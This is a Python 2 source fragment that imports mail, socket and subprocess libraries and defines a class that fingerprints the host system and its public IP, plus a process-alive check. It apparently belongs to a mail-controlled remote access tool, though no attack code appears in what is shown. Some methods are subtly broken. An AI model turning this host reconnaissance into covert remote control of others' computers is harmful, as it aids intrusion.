# -*- coding: cp1252 -*-
# imports here
import socket,subprocess
import smtplib
import poplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email import parser
from time import strftime
import os
import platform
import email,imaplib
import sys
import re
import urllib
import time
import threading
import errno

from ipgetter import IPgetter

class Info_retriever(IPgetter):
        def __init__(self):
                IPgetter.__init__(self)
                self.pc_info = self.get_pc_info()
        def get_pc_info(self):
                def linux_distribution():
                        try:
                                return platform.linux_distribution()
                        except:
                                return "N/A"
                pc_info=("""
                        Python version: %s
                        dist: %s
                        linux_distribution: %s
                        system: %s
                        machine: %s
                        platform: %s
                        uname: %s
                        version: %s
                        mac_ver: %s
                        """ % (
                        sys.version.split('\n'),
                        str(platform.dist()),
                        linux_distribution(),
                        platform.system(),
                        platform.machine(),
                        platform.platform(),
                        platform.uname(),
                        platform.version(),
                        platform.mac_ver(),
                        ))
                return pc_info

        def getScriptPath():
                return os.path.dirname(os.path.realpath(sys.argv[0]))

        def check_if_alive(self, pid = str()):
                if pid != str():
                        try:
                                os.kill(int(pid), 0)
                        except OSError, err:
                                if err.errno == errno.ESRCH:
                                        print "[-] Not running"
                                elif err.errno == errno.EPERM:
                                        return "[!] No permission to signal this process!"
                                else:
                                        return "[-] Unknown error"
                        else:
                                return "[+] Running"
                else:
                        return "[-] unknown pid: '" + str(pid) + "'"


